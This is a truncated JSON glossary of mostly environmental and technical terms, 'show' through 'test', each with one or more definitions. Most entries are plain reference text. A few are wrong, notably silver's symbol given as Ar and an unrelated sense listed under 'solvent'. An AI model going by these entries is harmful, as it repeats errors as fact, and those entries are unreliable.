\"show\": [\"A performance, program or exhibition providing entertainment to a group of people, displayed either through some communication media, such as radio or television, or live at a museum or theater.\", \"To give a proof that something is true.\", \"To have somebody see something.\", \"To go or travel in the company of someone.\", \"The pretending that something is the case in order to make a good impression.\"], \"shredder\": [\"A size-reduction machine which tears or grinds materials to a smaller and more uniform particle size.\"], \"shrub\": [\"A woody perennial plant, smaller than a tree, with several major branches arising from near the base of the main stem.\", \"A plant resembling a small tree, but has no, and will never develop, a stem.\"], \"sick building syndrome\": [\"A set of symptoms, including headaches, fatigue, eye irritation, and dizziness, typically affecting workers in modern airtight office buildings and thought to be caused by indoor pollutants, such as formaldehyde fumes, particulate matter, microorganisms, etc.\"], \"side effect\": [\"Any secondary effect, especially an undesirable one.\"], \"sieving\": [\"The size distribution of solid particles on a series of standard sieves of decreasing size, expressed as a weight percent.\\\\n(Source: MGH)\"], \"silencer\": [\"Any device designed to reduce noise, especially the device in the exhaust system of a motor vehicle.\"], \"silicon\": [\"A brittle metalloid element with symbol Si and atomic number 14 that exists in two allotropic forms; occurs principally in sand, quartz, granite, feldspar, and clay. It is usually a grey crystalline solid but is also found as a brown amorphous powder. It is used in transistors, rectifiers, solar cells, and alloys. Its compounds are widely used in glass manufacture, the building industry, and in the form of silicones.\"], \"silo\": [\"A large round tower on a farm for storing grain or winter food for cattle.\"], \"silt\": [\"The fine mineral material formed from the erosion of rock fragments and deposited by rivers and lakes. Its particles are the intermediate form between sand and clay. The particles can range in size from 0.01-0.05 mm in diameter.\"], \"silver\": [\"A very ductile malleable brilliant greyish-white element with symbol Ar and atomic number 47 having the highest electrical and thermal conductivity of any metal.\", \"Made of silver.\", \"The colour of silver. A shiny greyish-white.\"], \"simulation\": [\"A representation of a problem, situation in mathematical terms, especially using a computer.\\\\n(Source: CED)\", \"The attempt by a football player to gain an unfair advantage by falling to the ground and possibly feigning an injury.\"], \"sizing\": [\"Act of fixing the cross-section of structural components on the basis of statics and material strength.\"], \"skiing\": [\"The gliding over snow on skis, especially as a sport.\"], \"skin\": [\"The tissue forming the outer covering of the vertebrate body: it consists of two layers, the outermost of which may be covered with hair, scales, feathers, etc. It is mainly protective and sensory in function.\", \"Strip or pull off the skin or hide of\"], \"slag\": [\"A nonmetallic product resulting from the interaction of flux and impurities in the smelting and refining of metals.\"], \"slaughterhouse\": [\"A place where animals are butchered for food.\"], \"slaughterhouse waste\": [\"Animal body parts cut off in the preparation of carcasses for use as food. This waste can come from several sources including slaughterhouses, restaurants, stores and farms.\\\\n(Source: OED)\"], \"sleep\": [\"A periodic state of physiological rest during which consciousness is suspended and metabolic rate is decreased.\", \"To rest in a state of decreased consciousness and reduced metabolism.\"], \"sleep disturbance\": [\"Medical disorder of the sleep patterns of a person or animal. (Source: Wikipedia)\"], \"sludge\": [\"A semifluid, slushy, murky mass of sediment resulting from treatment of water, sewage, or industrial and mining wastes, and often appearing as local bottom deposits in polluted bodies of water.\\\\n(Source: BJGEO)\", \"Soaked clay or soil; very soft ground.\", \"A soft, soupy, or muddy bottom deposit, such as found on tideland or in a stream bed.\"], \"sluice\": [\"Vertical sliding gate or valve to regulate the flow of water in a channel or lock.\"], \"smog\": [\"Air pollution consisting of smoke and fog.\"], \"smog warning\": [\"Action, device or announcement that serves to give caution or notice to the level of air pollutants typically associated with oxidants in a given area.\"], \"smoke\": [\"An aerosol, consisting of visible particles and gases, produced by the incomplete burning of carbon-based materials, such as wood and fossil fuels.\", \"To inhale smoke from for example a cigarette or a cigar.\", \"A product manufactured out of cured and finely cut leaves, which are rolled or stuffed into a paper-wrapped cylinder for smoking.\", \"To kill a person or an animal with a shot from a firearm.\", \"To expose food to the smoke of wood fires in order to preserve it.\", \"To give off smoke.\"], \"smoking\": [\"The inhalation and exhalation of carcinogenic fumes from burning plant material, usually tobacco.\", \"The process of flavoring, cooking, or preserving food by exposing it to the smoke from burning or smoldering plant materials, most often wood.\"], \"colubrid\": [\"Family of snakes (Colubridae), including many harmless snakes, such as the grass snake.\"], \"snow\": [\"The most common form of frozen precipitation, usually flakes or starlike crystals, matted ice needles, or combinations, and often rime-coated.\", \"To fall from the clouds in the form of ice crystals.\", \"Material composed of small ice crystals.\", \"A street name for cocaine.\", \"To confuse completely by concealing one's true motives from, especially by elaborately feigning good intentions so as to gain an end.\"], \"snowslide\": [\"An avalanche of relatively pure snow; some rock and earth material may also be carried downward.\"], \"soaking\": [\"Absorption of liquid by a solid or a semisolid material.\\\\n(Source: MGH)\"], \"soap\": [\"A cleansing agent, manufactured in bars, granules, flakes, or liquid form, made from a mixture of the sodium salts of various fatty acids of natural oils and fats.\", \"A television serial about the lives of melodramatic characters, which are often filled with strong emotions, highly dramatic situations and suspense.\"], \"social condition\": [\"An existing circumstance, situation or state affecting the life, welfare and relations of human beings in community.\\\\n(Source: RHW)\"], \"social development\": [\"The state of nations and the historical processes of change experienced by them.\"], \"social differentiation\": [\"A concept associated with evolutionary theories of history and with structural functionalism. Societies are seen as moving from the simple to the complex via a process of social change based on structural differentiation.\"], \"social dynamics\": [\"The pattern, change, development and driving forces of a human group, community or society.\"], \"social facility\": [\"Any structure designed, built or installed to provide space for living or interaction among persons in a community.\\\\n(Source: RHW)\"], \"social group\": [\"A collection of people who interact with one another and share a certain feeling of unity.\\\\n(Source: SOC)\"], \"social medicine\": [\"Medicine as applied to treatment of diseases which occur in certain social groups.\"], \"social movement\": [\"A organized effort by a significant number of people to change (or resist change in) some major aspect or aspects of society.\"], \"social participation\": [\"Collective, civic action shared and performed by a significant number of the community or general population.\\\\n(Source: RHW)\"], \"social policy\": [\"A course of action adopted and pursued by government, business or some other organization, which seeks to ensure that all people have acceptable working or living conditions by providing social security, welfare, health care, insurance, fair employment practices, low cost housing or educational opportunities.\"], \"social problem\": [\"A generic term applied to the range of conditions and aberrant behaviours which are considered to be manifestations of social disorganization and to warrant changing via some means of social engineering.\"], \"social relief\": [\"Public assistance especially financial given to persons in special need or difficulty.\"], \"social security\": [\"Branch of social legislation which has as its purpose the protection of workers from risks resulting from the impairment or loss of their earning capacity due to predetermined events.\"], \"social structure\": [\"A term loosely applied to any recurring pattern of social behaviour; or, more specifically, to the ordered interrelationships between the different elements or a social system or society.\"], \"social system\": [\"The concept of system appears throughout the social and natural sciences and has generated a body of literature of its own (general systems theory). A system is any pattern of relationships between elements, and is regarded as having emergent properties on its own over and above the properties of its elements.\"], \"society\": [\"Human group of people, more or less large and complex, associated for some common interest and characterized by distinctive hierarchical relationships.\", \"A formal association of people with similar interests.\"], \"sociology\": [\"The study of the development, organization, functioning and classification of human societies.\"], \"software\": [\"The general term used to describe all of the various programs that may be used on a computer system. It can be divided into four main categories: systems software, development software, user interface software, applications software.\"], \"soil\": [\"The top layer of the land surface of the earth that is composed of disintegrated rock particles, humus, water and air.\", \"A mixture of sand and organic material, used to support plant growth.\", \"To make filthy.\", \"To become filthy.\"], \"soil acidification\": [\"The buildup of hydrogen cations, also called protons, which reduces the pH of the soil.\"], \"soil air\": [\"The air and other gases in spaces in the soil; specifically that which is found within the zone of aeration. Also known as soil atmosphere.\\\\n(Source: MGH)\"], \"soil biology\": [\"The study of the living organisms, mainly microorganisms and microinvertebrates which live within the soil, and which are largely responsible for the decomposition processes vital to soil fertility.\"], \"soil chemistry\": [\"The study of the inorganic and organic components of the soil and its life cycles.\"], \"soil compaction\": [\"An increase in bulk density (mass per unit volume) and a decrease in soil porosity resulting from applied loads, vibration, or pressure.\"], \"soil condition\": [\"Description of the character of the surface of the ground at the time of observation, especially in relation to the influence of rain and snow.\\\\n(Source: ECHO2)\"], \"soil decontamination\": [\"Technologies employed in the removal of PCBs, PAH, pesticides and, more generally, of organic compounds by physical, chemical or biological treatments.\\\\n(Source: EUROPAa)\"], \"soil erosion\": [\"Detachment and movement of topsoil or soil material from the upper part of the profile, by the action of wind or running water, especially as a result of changes brought about by human activity, such as unsuitable or mismanaged agriculture.\"], \"soil fertility\": [\"The status of a soil with respect to the amount and availability to plants of elements necessary for plant growth.\"], \"soil formation\": [\"The combination of natural processes by which soils are formed.\"], \"soil improvement\": [\"Process of protecting the soil from excessive erosion and making soil more fertile and productive.\\\\n(Source: LANDY)\"], \"soil layer\": [\"Distinctive successive layers of soil produced by internal redistribution processes. Conventionally the layers have been divided into A, B and C horizons. The A horizon is the upper layer, containing humus and is leached and/or eluviated of many minerals. The B horizon forms a zone of deposition and is enriched with clay minerals and iron/aluminium oxides from the A layer. The C layer is the parent material for the present soil and may be partially weathered rock, transported glacial or alluvial material or an earlier soil.\\\\n(Source: ALL)\"], \"soil map\": [\"A two-dimensional representation that shows the areal extent or the distribution of soils in relation to other features of the land surface.\"], \"soil mechanics\": [\"The study of the physical properties of soil, especially those properties that affect its ability to bear weight such as water content, density, strength, etc.\\\\n(Source: CED)\"], \"soil mineralogy\": [\"Study of the formation, occurrence, properties, composition, and classification of the minerals present in the soil.\\\\n(Source: BJGEOa)\"], \"soil moisture\": [\"Water stored in soils.\"], \"soil organism\": [\"Organism which lives in the soil.\"], \"soil pollutant\": [\"Solid, liquid and gaseous substances that detrimentally alter the natural condition of the soil.\"], \"soil profile\": [\"A vertical section of a soil, showing horizons and parent material.\"], \"soil quality\": [\"All current positive or negative properties with regard to soil utilization and soil functions.\"], \"soil salination\": [\"The accumulation of soluble mineral salts near the surface of soil, usually caused by the capillary flow of water from saline ground water.\"], \"soil science\": [\"The study of the properties, occurrence, and management of soil as a natural resource.\"], \"soil subsidence\": [\"A sinking down of a part of the earth's crust, generally due to underground excavations.\"], \"soil surface sealing\": [\"Any activity or process in which ground surface areas are packed or plugged to prevent percolation or the passage of fluids.\"], \"soil type\": [\"A phase or subdivision of a soil series based primarily on texture of the surface soil to a depth at least equal to plow depth (about 15 cm).\\\\n(Source: BJGEO)\"], \"soil use\": [\"Functional utilization of soil for agriculture, industry, or residential building purposes.\\\\n(Source: GREMES)\"], \"soil water\": [\"Water stored in soils.\\\\n(Source: LANDY)\"], \"solar cell\": [\"A device for converting sunlight into electrical power using a semiconductor sensitive to the photovoltaic effect.\", \"A device that absorbs radiant energy and converts it into electrical energy.\"], \"solar collector\": [\"Device which converts the energy from light into electricity.\"], \"solar energy\": [\"The energy transmitted from the sun in the form of electromagnetic radiation. The most successful examples of energy extraction from the sun are so far solar cells used in satellites and solar collectors used to heat water.\\\\n(Source: MGH /  ALL)\"], \"solar heating\": [\"A domestic or industrial heating system that makes direct use of solar energy.\"], \"solar power station\": [\"Plant where energy is generated using radiation from the sun.\"], \"solar radiation\": [\"The electromagnetic radiation and particles emitted by the sun.\"], \"solid matter\": [\"A crystalline material, that is, one in which the constituent atoms are arranged in a three-dimensional lattice, periodic in three independent directions.\"], \"solid state\": [\"The physical state of matter in which the constituent molecules, atoms, or ions have no translatory motion although they vibrate about the fixed positions that they occupy in a crystal lattice.\"], \"solubility\": [\"The ability of a substance to form a solution with another substance.\\\\n(Source: MGH)\"], \"solvent\": [\"Substance, generally a liquid, capable of dissolving another substance.\", \"The conclusion or end to which any course or condition of things leads.\"], \"songbird\": [\"Any passerine bird of the suborder Oscines, having highly developed vocal organs and, in most, a music call.\\\\n(Source: CED)\"], \"sonic boom\": [\"A noise caused by a shock wave that emanates from an aircraft or other object traveling at or above sonic velocity.\"], \"soot\": [\"Impure black carbon with oily compounds obtained from the incomplete combustion of resinous materials, oils, wood, or coal.\"], \"sorption\": [\"The taking up, usually, of a liquid or gas into the body of another material (the absorbent).\"], \"sound\": [\"Auditory sensation produced by the oscillations, stress, pressure, particle displacement, and particle velocity in a medium with internal forces; pressure variation that the human ear can detect.\\\\n(Source: KOREN)\", \"To produce a sound.\"], \"sound emission\": [\"Diffusion into the environment of a sound emitted from a given source.\"], \"sound immission\": [\"The introduction in the environment of noise deriving from various sources that can be grouped in: transportation activities, industrial activities and daily normal activities.\\\\n(Source: DIFIDa)\"], \"sound level\": [\"The sound pressure level (in decibels) at a point in a sound field, averaged over the audible frequency range and over a time interval.\\\\n(Source: MGH)\"], \"soundproofing\": [\"Reducing or eliminating reverberation in a room by placing sound-absorbing materials on the walls and ceiling.\\\\n(Source: MGH)\"], \"sound propagation\": [\"The travelling of acoustic waves in the atmosphere with a speed independent of their amplitude. The speed only depends on the acoustic medium and is proportional to the square root of the absolute temperature for any given medium.\\\\n(Source: RRDA /  PARCOR)\"], \"sound transmission\": [\"Passage of a sound wave through a medium or series of media.\"], \"South America\": [\"A continent in the southern part of the western hemisphere, astride the equator and the Tropic of Capricorn, bordered by the Caribbean Sea to the north and between the Atlantic and Pacific Oceans, connected to North America by the Isthmus of Panama, and divided into twelve countries:  Argentina, Bolivia, Brazil, Chile, Columbia, Ecuador, Guyana, Paraguay, Peru, Suriname, Uruguay and Venezuela.\"], \"South Atlantic Ocean\": [\"An ocean south of the equator between the eastern coast of South America and the western coast of Africa that extends southward to the Antarctic continent, including the Drake Passage, South Sandwich Islands and Falkand Islands.\"], \"Southeast Asia\": [\"A geographic region of continental Asia, south of China, west of the South Pacific Ocean, north of the Indian Ocean, and east of the Bay of Bengal and the Indian subcontinent, including the Indochina Peninsula, the Malay Peninsula and the Indonesian and Philippine Archipelagos, and countries such as Brunei, Cambodia, Indonesia, Laos, Malaysia, Myanmar, the Philippines, Singapore, Thailand and Vietnam.\"], \"Southern Africa\": [\"A geographic region of the African continent astride the Tropic of Capricorn, including Angola, Botswana, Lesotho, Malawi, Mozambique, Namibia, South Africa, Swaziland, Zambia and Zimbabwe, and also the Kalahari Desert, Zambezi River and Orange River.\\\\n(Source: AFR)\", \"ISO 639-6 entity\"], \"Southern Asia\": [\"A geographic region of the Asian continent bordered in the north by the countries of Central Asia and in the south by the Arabian Sea and the Bay of Bengal, extending  westward into Iran and eastward into China, including Afghanistan, Pakistan, India, Nepal, Bangladesh, Burma, Bhutan and Sri Lanka.\"], \"South Pacific Ocean\": [\"An ocean south of the equator between Southeast Asia and Australia in the Eastern hemisphere and South America in the Western hemisphere, extending southward to the Antarctic region, including the Tasman and Coral seas and numerous islands, such as Galapagos, Solomon, Easter, Samoa, Fiji and Tonga islands, and also New Zealand and its islands.\"], \"space travel\": [\"Travel in the space beyond the earth's atmosphere performed for scientific research purposes.\"], \"space waste\": [\"Nonfunctional debris of human origin left in a multitude of orbits about the earth as the result of the exploration and use of the environment lying outside the earth's atmosphere.\"], \"spasmodic croup\": [\"A respiratory condition that is usually triggered by an acute viral infection of the upper airway.\"], \"special law\": [\"One relating to particular persons or things; one made for individual cases or for particular places or districts; one operating upon a selected class, rather than upon the public generally. A law is special when it is different from others of the same general kind or designed for a particular purpose, or limited in range or confined to a prescribed field of action or operation.\"], \"special waste\": [\"Waste which must be handled in a particular manner and for which particular rules apply.\"], \"species\": [\"A taxonomic category ranking immediately below a genus and including closely related, morphologically similar individuals which actually or potentially inbreed.\"], \"conservation of species\": [\"Controlled utilization, protection or development of selected classes of plants or animals for their richness, biodiversity and benefits to humanity.\\\\n(Source: TOE / EEN)\"], \"spectroscopy\": [\"The branch of physics concerned with the production, measurement, and interpretation of electromagnetic spectra arising from either emission or absorption of radiant energy by various substances.\"], \"speed\": [\"A scalar measure of the rate of movement of a body expressed either as the distance travelled divided by the time taken (average speed) or the rate of change of position with respect to time at a particular point (instantaneous speed). It is measured in metres per second, miles per hour, etc.\", \"To move faster.\", \"An addictive psychoactive drug of formula C\\u2081\\u2080H\\u2081\\u2085N.\", \"To cause to move faster.\", \"To move fast.\"], \"speed limit\": [\"The maximum permitted speed at which a vehicle may travel on certain roads.\"], \"spider\": [\"Any predatory silk-producing arachnid of the order Araneae, having four pairs of legs and a rounded unsegmented body consisting of abdomen and cephalothorax.\", \"A type of skimmer in the form of a wire mesh basket attached to a handle, used to remove food from a hot liquid or skim off foam from a broth.\"], \"spillage\": [\"The uncontrolled discharge, leakage, dripping or running over of fluids or liquid substances.\", \"Fluid or liquid substance that was discharged, leaked, dripped or running over without control.\"], \"spoil dump\": [\"Place where rubbish and waste minerals dug out of a mine are deposited.\"], \"poriferan\": [\"A phylum of the animal kingdom characterized by the presence of canal systems and chambers through which water is drawn in and released; tissues and organs are absent.\"], \"sport\": [\"The complex of individual or group activities pursued for exercise or pleasure, often taking a competitive form.\", \"A person who engages in sports.\"], \"sports facility\": [\"Buildings, constructions, installations, organized areas and equipment for indoor and outdoor sport activities.\\\\n(Source: RRDA)\"], \"spray can\": [\"An aerosol can for applying paint, deodorant, etc., as a fine spray.\"], \"sprayed asbestos\": [\"Asbestos emitted into the atmosphere in a spraying operation.\"], \"spring water\": [\"Water obtained from an underground formation from which water flows naturally to the surface, or would flow naturally to the surface if it were not collected underground.\"], \"square\": [\"Delimited area on a game board, a form or in a table\", \"An open area in a town, sometimes including the surrounding buildings.\", \"A two dimensional polygon with four equal sides and four right angles.\", \"Mathematics: to multiply a value, term, or expression by itself.\", \"Having the shape of a square (the polygone).\"], \"squatter settlement\": [\"Settlement on the outskirts of a city, often built without authorization, where poor people live in improvised dwellings made from carton, wood or corrugated metal.\"], \"stable\": [\"A building or structure usually with stalls that is used to house and feed horses, cattle or other animals.\", \"In a state that is not likely to change.\"], \"stack\": [\"A great number or large amount of things not placed in a pile.\", \"A pile of similar objects, each directly on top of the last.\", \"A linear data structure in which the last datum stored is the first retrieved.\", \"To place one or more objects or material in the form of a stack or on an existing stack.\", \"To put together several things in one pile; to arrange in stacks.\"], \"standard\": [\"Something considered by an authority or by general consent as a basis of comparison.\", \"A rule or principle that is used as a basis for judgement.\", \"An object regarded as the most common size or form of its kind.\", \"An average or normal quality, quantity, or level.\"], \"staple food\": [\"The most commonly or regularly eaten food in a country or community and which forms the mainstay of the total calorie supply, especially in the poorer populations and at times of food shortage.\"], \"starch\": [\"A polysaccharide which is a combination of many monosaccharide molecules, made during photosynthesis and stored as starch grains in many plants.\", \"To treat with laundry starch in order to stiffen.\"], \"state\": [\"A people permanently occupying a fixed territory bound together by common law, habits and custom into one body politic exercising, through the medium of an organized government, independent sovereignty and control over all persons and things within its boundaries, unless or until authority is ceded to a federation or union of other states.\", \"A political entity asserting ultimate authority over a geographical area.\", \"The condition in which someone or something is in.\", \"To declare to be a fact.\", \"A political division of a federation retaining a degree of autonomy.\", \"In computing, the stable condition of a processor during a particular clock cycle.\", \"In computing, the set of all parameters relevant to a computation.\", \"In computing, the values of all parameters at some point in a computation.\", \"To put before.\"], \"state of the art\": [\"Everything made available to the public by means of a written or oral description, by use or in any other way before the date of the patent application, or an application filed in a foreign country the priority of which is validly claimed.\"], \"state of matter\": [\"One of the three fundamental conditions of matter: the solid, the liquid, and gaseous states.\"], \"station\": [\"A place along a route or line at which a bus, train, etc. stops for fuel or to pick up or let off passengers or goods, especially with ancillary buildings and services.\", \"A place used for broadcasting radio or television.\"], \"statistical analysis\": [\"The body of techniques used in statistical inference concerning a population.\"], \"statistics\": [\"A branch of mathematics dealing with the collection, analysis, interpretation, and presentation of masses of numerical data.\"], \"status of development\": [\"The extent to which a society promotes human well-being in all dimensions of existence by forming people's capabilities, expanding choices and increasing opportunities.\\\\n(Source: POP)\"], \"steam generator\": [\"A pressurized system in which water is vaporized to steam by heat transferred from a source of higher temperature, usually the products of combustion from burning fuels.\"], \"steel\": [\"Any of various alloys based on iron containing carbon (usually 0.1-0.7 per cent) and often small quantities of other elements such as phosphorus, sulphur, manganese, chromium, and nickel. Steels exhibit a variety of properties, such as strength, machinability, malleability, etc., depending on their composition and the way they have been treated.\"], \"steel industry\": [\"Industry that deals with the processing of iron.\"], \"steroid\": [\"A compound composed of a series of four carbon rings joined together to form a structural unit called cyclopentanoperhydrophenanthrene.\"], \"stock management\": [\"The handling or controlling of accumulated materials or stored goods.\"], \"stocktaking\": [\"The counting over of materials or goods on hand, as in a stockroom or store.\"], \"stone\": [\"A lump or mass of hard consolidated mineral matter that is used in construction, either crushed for use as aggregate or cut into shaped blocks as dimension stone.\", \"A small (and usually irregular) piece of mineral, approximately 20-200 mm in diameter.\", \"The wooden shell found inside some fruits, particularly drupes, that surrounds the seed.\", \"To kill or excecute (a person) by throwing rocks or boulders at and on them.\", \"An Imperial unit of weight and mass, equal to 6.35029318 kilograms.\", \"Made out of stone.\"], \"storm\": [\"An atmospheric disturbance involving perturbations of the prevailing pressure and wind fields on scales ranging from tornadoes to extratropical cyclones; also the associated weather and the like.\\\\n(Source: MGH)\", \"To act or speak violently, as if in state of a great anger.\"], \"storm damage\": [\"Damage caused by a storm, for example damaged houses, streets and power lines, uprooted trees, destroyed crops.\"], \"stove\": [\"A chamber within which a fuel-air mixture is burned to provide heat, the heat itself being radiated outward from the chamber; used for space heating, process-fluid heating, and steel blast furnaces.\", \"A kitchen appliance used for cooking food.\"], \"stratification\": [\"The arrangement of a body of water, as a lake, into two or more horizontal layers of different characteristics, especially densities.\\\\n(Source: MGH)\"], \"stratosphere\": [\"The layer of the atmosphere which is sandwiched between the troposphere and mesosphere.\"], \"stratospheric ozone depletion\": [\"Damage of the ozone shield by chemicals released on Earth.\"], \"stream measurement\": [\"The quantitative determination of the rate and amount of flow or discharge from a natural body of running water, such as a small river or brook.\"], \"street cleaning\": [\"The process of removing dirt, litter or other unsightly materials from city or town streets.\"], \"strength of materials\": [\"The material's ability to resist an applied force.\"], \"stress\": [\"A stimulus or succession of stimuli of such magnitude as to tend to disrupt the homeostasis of the organism.\", \"Emphasis on a word or phrase by pronouncing it by increasing the volume or changing the tone.\", \"To stress, single out as important.\", \"Difficulty that causes worry or emotional tension.\", \"To test the limits of.\", \"To put stress on; to utter with an accent.\"], \"strip mining\": [\"Superficial mining, in which the valuable rock is exposed by removal of overburden.\"], \"strontium\": [\"A soft silvery-white element of the alkaline earth group of metals, occurring chiefly as celestite and as strontianite.\"], \"structure-activity relationship\": [\"The association between a chemical structure and carcinogenicity.\"], \"structure-borne noise\": [\"Sound that travels over at least part of its path by means of the vibration of a solid structure.\"], \"submarine morphology\": [\"That aspect of geological oceanography which deals with the relief features of the ocean floor and with the forces that modify them.\"], \"submarine\": [\"A boat that can go underwater.\", \"Located under the surface of the sea.\"], \"subsidence\": [\"A sinking down of a part of the earth's crust, generally due to underground excavations.\", \"The sudden sinking or gradual downward settling of the Earth's surface with little or no horizontal motion. The movement is not restricted in rate, magnitude, or area involved. Subsidence may be caused by natural geologic processes, such as solution, thawing, compaction, slow crustal warping, or withdrawal of fluid lava from beneath a solid crust; or by man's activity, such as subsurface mining or the pumping of oil or ground water.\"], \"subsidy\": [\"Any monetary grant made by the government to a private industrial undertaking or charitable organization, but especially one given to consumers or producers in order to lower the market price of some service or product and make it readily affordable to the public.\"], \"subsoil\": [\"Soil underlying surface soil, devoid of plant roots.\"], \"suburb\": [\"A residential district situated on the outskirts of a city or town.\"], \"sulphur dioxide\": [\"A poisonous gas with the formula SO2 that is released by volcanoes and the burning of coal and petroleum.\"], \"sulphuric acid\": [\"A highly corrosive acid made from sulfur dioxide; widely used in the chemical industry.\"], \"surface-active agent\": [\"A substance that, when used in small quantities, modifies the surface properties of liquids or solids.\"], \"surface runoff\": [\"The water flow that occurs when the soil is infiltrated to full capacity and excess water from rain, meltwater, or other sources flows over the land.\"], \"surface tension\": [\"The force acting on the surface of a liquid, tending to minimize the area of the surface; quantitatively, the force that appears to act across a line of unit length on the surface. Also known as interfacial force; interfacial tension; surface intensity.\\\\n(Source: MGH)\"], \"surface treatment\": [\"Any method of treating a material (metal, polymer, or wood) so as to alter the surface, rendering it receptive to inks, paints, lacquers, adhesives, and various other treatments, or resistant to weather or chemical attack.\"], \"surface water\": [\"All waters on the surface of the Earth found in streams, rivers, ponds, lakes, marshes or wetlands, and as ice and snow.\"], \"surgical waste\": [\"Any tissue, blood or mucus removed during surgery or autopsy, soiled surgical dressings, or other materials requiring special disposal procedures.\"], \"surplus\": [\"The extent to which assets exceed liabilities, especially the profits remaining after operating expenses, taxes, interest and insurance costs are subtracted.\\\\n(Source: IVW)\", \"More than is needed, desired, or required.\"], \"survey\": [\"A critical examination of facts or conditions to provide information on a situation. Usually conducted by interviews and/or on-site visitations.\", \"A detailed critical inspection.\", \"To plot a map of (land).\"], \"sustainable development\": [\"Development that provides economic, social and environmental benefits in the long term having regard to the needs of living and future generations.\"], \"marsh\": [\"An periodically inundated area of low ground having shrubs and trees, with or without the formation of peat.\"], \"sweetener\": [\"A sweetening agent, especially one that does not contain sugar.\"], \"symbiosis\": [\"A close and mutually beneficial association of organisms of different species.\"], \"synecology\": [\"Study of the ecology of organisms, populations, communities or systems.\"], \"synergism\": [\"An ecological association in which the physiological processes of behaviour of an individual are enhanced by the nearby presence of another organism.\"], \"synthetic detergent\": [\"An artificially produced solid or liquid cleansing substance that acts like soap but is stronger, and is capable of dissolving oily materials and dispersing them in water.\\\\n(Source: DOE / RIC)\"], \"synthetic material\": [\"Material made artificially by chemical reaction.\\\\n(Source: CEDa)\"], \"systems analysis\": [\"A means of organizing elements into an integrated analytic and/or decisionmaking procedure to achieve the best possible results.\\\\n(Source: LANDY)\"], \"systems theory\": [\"The science concerned with the general study of structures and behaviours of systems which may be applicable in different branches of learning.\"], \"tank farm\": [\"Storage space for containers of liquids or gases.\"], \"tannin\": [\"One of a group of complex organic chemicals commonly found in leaves, unripe fruits, and the bark of trees.\"], \"tar\": [\"A viscous material composed of complex, high-molecular-weight, compounds derived from the distillation of petroleum or the destructive distillation of wood or coal.\", \"A long-necked, waisted lute.\"], \"target group\": [\"The group of people that something, for example an advertising campaign, is primarily aimed at.\"], \"tariff\": [\"A classified list or scale of charges made in any private or public business.\\\\n(Source: OED)\"], \"tar sand\": [\"A mixture of bitumen, sand, clay and water.\"], \"tax\": [\"An amount of money demanded by a government for its support or for specific facilities or services, most frequently levied upon income, property or sales.\"], \"taxation\": [\"The act or result of a government requiring money for its support or for specific facilities or services.\\\\n(Source: RHW)\"], \"tax law\": [\"A binding rule or body of rules prescribed by a government stipulating the sum of money and manner of collection it demands for governmental support, facilities and services, usually levied upon income, property, sales or other financial resources.\"], \"taxonomy\": [\"The branch of biology concerned with the classification of organisms into groups based on similarities of structures, origin, etc.\", \"A hierarchical organization of a subject area, from one perspective in one language.\"], \"teaching\": [\"The act of imparting knowledge or skill.\"], \"teaching method\": [\"A procedure, technique or system with definite plans for instruction or imparting knowledge.\"], \"technology\": [\"Systematic knowledge of industrial processes and their application.\"], \"technology assessment\": [\"The systematic analysis of the anticipated impact of a particular technology in regard to its safety and efficacy as well as its social, political, economic, and ethical consequences.\\\\n(Source: KOREN)\"], \"technology transfer\": [\"The transfer of development and design work from a parent company to a subsidiary or from one country to another as a form of aid to help promote development and sustainable growth.\"], \"tectonics\": [\"A branch of geology dealing with the broad architecture of the outer part of the Earth, that is, the regional assembling of structural or deformation features, a study of their mutual relations, origin and historical evolution.\"], \"telecommunications\": [\"The conveyance of images, speech and other sounds, usually over great distances, through technological means, particularly by television, telegraph, telephone or radio.\"], \"telematics\": [\"The convergence of computing and communications technologies, thus the use of telephone or radio to link computers and the use of computers to send messages via telephone or radio links.\\\\n(Source: NECTAR)\"], \"telemetry\": [\"The use of radio waves, telephone lines, etc., to transmit the readings of measuring instruments to a device on which the readings can be indicated or recorded.\"], \"television\": [\"The process, equipment or programming involved in converting a succession of audiovisual images into corresponding electrical signals that are transmitted by means of electromagnetic waves to distant receivers or screens, at which the signals can be used to reproduce the original image.\", \"A device for receiving television signals and displaying them in visual form.\"], \"temperate forest\": [\"Mixed forest of conifers and broad-leaf deciduous trees, or mixed conifer and broad-leaf evergreen trees, or entirely broad-leaf deciduous, or entirely broad-leaf evergreen trees, found in temperate regions across the world; characterized by high rainfall, warm summers, cold winters occasionally subzero, seasonality; typically with dense canopies, understorey saplings and tall shrubs, large animals, carnivores dominant, very rich in bird species.\"], \"temperate woodland\": [\"Forest dominated by broad-leaved hardwoods, which occurs over large tracts in the mid-latitudes of Europe, N. America, and eastern Asia, but which is restricted in the southern hemisphere to Chilean Patagonia.\"], \"temperature\": [\"A measure of cold or hot. A property that determines the direction of heat flow when an object is brought into thermal contact with other objects.\"], \"temporary shelter\": [\"Simple facility for asylum or provisional lodgings to individuals or groups in emergencies.\\\\n(Source: ECHO2)\"], \"teratogenesis\": [\"The process whereby abnormalities of the offspring are generated, usually as the result of damage to the embryonal structure during the first trimester of pregnancy, producing deformity of the fetus.\"], \"teratogenicity\": [\"The ability or tendency to produce anomalies of formation.\"], \"teratogen\": [\"Substance causing formation of a congenital anomaly or monstrosity in the embryo.\"], \"terminology\": [\"The body of specialized words relating to a particular subject.\", \"The study of the designating of concepts particular to one or more domains of human activity, through research and analysis of terms in context, for the purpose of documenting and promoting correct usage.\"], \"termite\": [\"A soft-bodied insect of the order Isoptera; individuals feed on cellulose and live in colonies with a caste system comprising three types of functional individuals: sterile workers and soldiers, and the reproductives.\"], \"terrestrial area\": [\"Subdivisions of the continental surfaces distinguished from one another on the basis of the form, roughness, and surface composition of the land.\\\\n(Source: PARCOR)\"], \"territorial policy\": [\"A course of action adopted and pursued by government, business or some other organization, which determines the present and future use of each parcel of land in an area.\\\\n(Source: DOE)\"], \"territory\": [\"An area that an animal or group of animals defends, mainly against members of the same species.\", \"Land that is controlled by a specific country or ruler.\", \"Land or an area of a particular type.\", \"A tract of land of undefined size.\", \"A geographic area owned or controlled by a single person or organization.\", \"The region of responsibility assigned to a representative, agent, or the like.\", \"A non-sovereign geographic area which has come under the authority of an external government but has not yet been admitted to the full rights of a province or federal state of the controlling country.\"], \"tertiary sector\": [\"The part of a country or region's economy that produces services or assets lacking a tangible and storable form.\", \"The business sector that consists of companies whose line of work involves doing something for customers, but that do not produce goods.\"], \"test\": [\"To carry out an examination on (a substance, material, or system) by applying some chemical or physical procedure designed to indicate the presence of a substance or the possession of a property.\", \"A session in which a product or piece of equipment is placed under everyday and/or extreme conditions and is examined for its durability, etc.\", \"A series of questions (set by the 